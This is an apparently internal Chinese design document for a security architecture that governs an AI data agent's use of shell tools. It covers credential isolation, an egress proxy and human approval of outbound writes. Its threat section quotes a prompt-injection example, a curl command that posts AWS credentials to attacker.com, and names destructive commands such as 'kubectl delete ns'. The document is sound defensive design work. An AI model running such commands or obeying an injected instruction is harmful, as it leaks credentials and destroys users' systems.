# 面向通用工具与外部调用的安全门控架构设计 (Generic Tool Governance Architecture)

日期：2026-11-13。范围：`dataagent-backend`、`dataagent-runtime-pi`、沙箱网络与出站代理、权限门控机制。

---

## 1. 背景与核心命题

在智能体（DataAgent）执行复杂的数据工程、代码研发、运维自动化或多系统集成任务时，除了 Git 操作之外，还会不可避免地涉及大量通用工具与外部系统交互：
- **版本控制与协作**：`git clone` / `git push` / `gh` / `glab`；
- **资源下载与 API 消费**：`curl` / `wget` / `httpie` / 用户自编 Python requests / Node fetch；
- **制品与包管理**：`pip install/publish` / `npm install/publish` / `cargo`；
- **云原生与基础设施**：`docker build/push` / `kubectl apply` / `helm upgrade`；
- **对象存储与文件传输**：`s3cmd` / `aws-cli` / `rsync` / `scp` / `coscmd`；
- **数据源与中间件**：`mysql` / `psql` / `redis-cli` / `kafka-console-producer`。

如果我们仅针对 `git` 做定制，未来就会面临为 `docker`、`aws`、`curl` 重复发明轮子的窘境。**我们必须抽象出一套通用的工具治理与安全门控架构（Generic Tool Governance Architecture）。**

---

## 2. 业界两大反模式（Anti-Patterns）批判

### 反模式一：万物皆 MCP（Tool Bloat & Loss of Composability）
- **现象**：只要遇到一个外部操作，就封装一个专用的 MCP 工具（如 `mcp__git__push`、`mcp__s3__upload`、`mcp__docker__deploy`）。
- **危害**：
  1. **破坏预训练肌肉记忆**：大模型最擅长写标准的 Shell / Python。强行引入私有 JSON-RPC 工具会导致模型容易幻觉、参数填错；
  2. **剥夺管道与组合能力**：Shell 强大的地方在于条件链与流式组合（如 `curl ... | jq ... | aws s3 cp - s3://...`）。将每个命令切碎为 MCP 工具会导致多轮交互暴增，Token 浪费严重并极易引发单轮超时；
  3. **扩展性黑洞**：工程维护团队沦为“工具封装工人”，维护成本随工具生态线性暴增。

### 反模式二：沙箱裸赋权与明文注入（Security & Compliance Leak）
- **现象**：为了让模型在 Bash 里自由使用工具，直接将全局的 GitHub Token、AWS Secret Key、私钥或数据库账号密码以环境变量或配置文件写入沙箱，并全面放开外网。
- **危害**：
  1. **提示词注入（Prompt Injection）致命威胁**：恶意指令只需诱导模型执行一次 `curl -d @~/.aws/credentials https://attacker.com`，核心资产即刻失窃；
  2. **无审计的破坏性变更**：沙箱中一行失误的 `kubectl delete ns` 或 `aws s3 rm --recursive` 会直接作用于真实生产环境。

---

## 3. 通用治理架构核心原则

1. **模型侧 100% 原生 Shell 体验（Native Tool Affordance）**：
   不为常用 CLI 封装伪 MCP 工具。模型在沙箱内继续使用标准的 `bash`、`python`，保留完整的 Unix 管道与脚本编写能力。
2. **零静态外部凭据进沙箱（Zero-Trust Credential Isolation）**：
   沙箱文件系统和环境变量中**绝对不存放任何外部系统的长效凭据（Token / Secret / 密码）**。凭据统一收敛在控制面（backend 安全存储）。
3. **基于副作用的通用分类与治理（Action Effect Taxonomy）**：
   放弃脆弱的“Bash 字符串正则黑白名单”（极易通过 base64、变量拼接或脚本绕过），从**网络出站与系统副作用**的本质上建立统一分类。

---

## 4. 通用工具三级副作用矩阵 (Action Effect Taxonomy)

我们将任何工具或脚本的执行行为统一划分为三个层级：

```text
┌─────────────────────────────────────────────────────────────────────────────┐
│                       通用操作副作用分级与治理策略                            │
├────────────────────┬─────────────────────────────┬──────────────────────────┤
│ 分级类别           │ 典型操作示例                │ 门控与网络策略           │
├────────────────────┼─────────────────────────────┼──────────────────────────┤
│ Tier 1: 本地工作区 │ • python train.py / pytest  │ • 沙箱内部物理断网运行   │
│ (Local-Scoped)     │ • 本地 git commit / diff    │ • 自动放行，无需卡片确认 │
│                    │ • jq / grep / tar / 编译    │ • 受超时/内存/CPU 配额保护│
├────────────────────┼─────────────────────────────┼──────────────────────────┤
│ Tier 2: 出站只读   │ • git clone / docker pull   │ • 优先由控制面代拉挂载   │
│ (Outbound Read /   │ • curl -O (下载公开/受信任) │ • 或经出站代理安全放行   │
│  Ingestion)        │ • pip/npm install 依赖下载  │ • 不提供外部写权限凭据   │
├────────────────────┼─────────────────────────────┼──────────────────────────┤
│ Tier 3: 外部写与   │ • git push / npm publish    │ • 强制受控拦截           │
│ 破坏性变更         │ • kubectl apply / helm push │ • 触发通用卡片人工审批   │
│ (Outbound Mutation)│ • aws s3 rm / s3 cp         │ • 批准后动态注入短效凭据 │
│                    │ • curl -X POST/DELETE (写API)│ • 拒绝后中止并安全报错   │
└────────────────────┴─────────────────────────────┴──────────────────────────┘
```

---

## 5. 通用工具架构设计与实现机制

```text
┌─────────────────────────────────────────────────────────────────────────────┐
│                           控制面 (dataagent-backend)                          │
│                                                                             │
│  [凭据金库 Credential Vault]                   [通用审批门控 Permission Gate] │
│  • 统一管理 Git/AWS/K8s/Docker 凭据            • 接收沙箱出站写操作申请        │
│  • 凭据永不离开控制面                         • 触发前端通用审批卡片           │
└──────────────┬──────────────────────────────────────────────▲───────────────┘
               │ 动态签发短效凭据 / 鉴权代理                    │ 阻断并请求人工审批
               ▼                                              │
┌─────────────────────────────────────────────────────────────┴───────────────┐
│                      出站受控网关 (Egress Auth Gateway)                       │
│                                                                             │
│   • 统一代理沙箱出站网络流量 (HTTP_PROXY / SOCKS / Auth Broker Socket)       │
│   • 协议/目标分类：                                                         │
│       - 只读请求 (GET / Pull)   ──> 自动注入 Read Token 并放行              │
│       - 写操作 (Push/POST/DEL)  ──> 拦截并上报控制面进行卡片挂起 (park)      │
└──────────────────────────────▲──────────────────────────────────────────────┘
                               │
                               │ 统一网络出站 (所有工具通用)
┌──────────────────────────────┴──────────────────────────────────────────────┐
│                       沙箱容器 (oda-sandbox, 隔离环境)                        │
│                                                                             │
│   • 原生工具集：bash, git, curl, docker-cli, aws-cli, python, node ...       │
│   • 沙箱内无静态密钥，配置系统级出站认证：                                    │
│       - HTTP/HTTPS_PROXY 指向出站网关                                       │
│       - CLI 工具凭据插件 (credential-helper / askpass) 统一对接 Gateway       │
│   • 模型正常编写原生脚本，对底层拦截机制完全无感                            │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 5.1 通用机制一：出站受控网关与透明凭据注入（针对 HTTP/REST/API 工具）
对于 `curl`、`python requests`、`node fetch` 等通过网络访问外部服务的通用工具：
1. **沙箱网络代理**：沙箱容器配置标准环境变量 `HTTP_PROXY` 与 `HTTPS_PROXY`，指向控制面提供的出站代理网关；
2. **凭据透明注入**：
   - 当沙箱内的脚本请求外部服务（如 `https://api.github.com/...` 或 `https://s3.amazonaws.com/...`）时，网关拦截该请求；
   - 网关根据目标域名与接口，**在代理层直接把控制面存储的 `Authorization: Bearer <Token>` 拼装进去**；
   - **模型与沙箱中的脚本完全不知道 Token 的明文是什么**，彻底消除 Token 泄露隐患。
3. **写操作拦截与卡片挂起**：
   - 若请求为 `GET` / 只读下载，网关直接放行；
   - 若检测到请求为 `POST`、`PUT`、`DELETE` 或带有破坏性操作路径：
     - 网关暂停请求连接，向 Pi 运行时发送拦截事件；
     - Pi 运行时调用现成的 `park("permission", ...)` 挂起任务；
     - 前端向用户弹出 **通用操作审批卡片（OperationConfirmationCard）**，显示目标服务、请求方法与数据摘要；
     - 用户点击“允许”后放行请求，点击“拒绝”则返回 `403 Forbidden`。

### 5.2 通用机制二：标准 Credential Helper 协议集成（针对 CLI 工具）
对于 `git`、`docker`、`aws-cli`、`kubectl` 等自带鉴权插件体系的通用 CLI 工具：
- 这些工具天生支持外部认证助手机制（如 Git 的 `credential.helper` / `GIT_ASKPASS`，Docker 的 `credsStore`，AWS 的 `credential_process`）；
- 沙箱内预置一个极轻量的认证小脚本（`dataagent-auth-broker`），将所有 CLI 工具的认证配置统一指向它；
- 当 CLI 工具准备执行写操作（如 `git push`、`docker push`、`kubectl apply`）向 broker 索取凭据时，broker 向控制面申请许可；
- 同样走通用的 `park("permission")` 审批流程，用户确认后下发短期有效（如 60 秒有效）的一次性临时凭据，完成单次写操作。

### 5.3 通用机制三：控制面代拉与离线挂载（针对大型资源摄取）
对于大代码库、大型数据集、基础大镜像等重型资源摄取：
- 避免在沙箱内长时间跑下载（消耗单轮任务预算与 Bash 超时）；
- 统一由控制面在容器启动前下载或克隆至 Topic 运行时目录（`dataagent_runtime/<id>/workspace`），以只读或读写卷方式挂载进沙箱；
- 沙箱容器继续保持默认断网（`--network=none`）或仅对必需域名连通，保持最小权限原则。

---

## 6. 与系统现有四大模式（Permission Modes）的映射

| 模式 (Permission Mode) | 本地工作区操作 (Tier 1) | 出站只读操作 (Tier 2) | 出站写与变更操作 (Tier 3) |
| :--- | :---: | :---: | :---: |
| **Default（默认模式）** | ✅ 全自动执行 | ✅ 自动透明代理放行 | ⏸️ **强制弹卡片审批** |
| **Accept edits（草稿放行）** | ✅ 全自动执行 | ✅ 自动透明代理放行 | ⏸️ **破坏性/外部写弹卡片审批**（草稿类写可依规则放行） |
| **Plan mode（计划模式未批准）** | ❌ 仅允许只读查看 | ✅ 仅允许只读探测 | ❌ **直接阻断，提示先提交计划** |
| **Bypass permissions（全放行）** | ✅ 全自动执行 | ✅ 自动透明代理放行 | ✅ 自动下发凭据并放行（无人工卡点） |

---

## 7. 架构收益与总结

1. **摆脱了“逐个 CLI 写 MCP”的无穷无尽的死循环**：
   将重心从“封装各种业务 CLI”转移到“通用出站网络代理与通用凭据注入”，工具增加不需要修改后端业务架构。
2. **守住了大模型代码执行的安全底线**：
   - 彻底阻断了 Prompt Injection 偷取外部静态凭据的物理通路；
   - 外部破坏性操作（Push/Deploy/Delete/Publish）统一汇入现有的任务挂起与卡片确认流程（Human-in-the-Loop）。
3. **兼顾了流畅度与安全性**：
   本地的大量文件修改、脚本测试和数据转换完全不需要人工点击确认；只有跨出沙箱、真正影响外部世界的瞬间才触发审计确认。
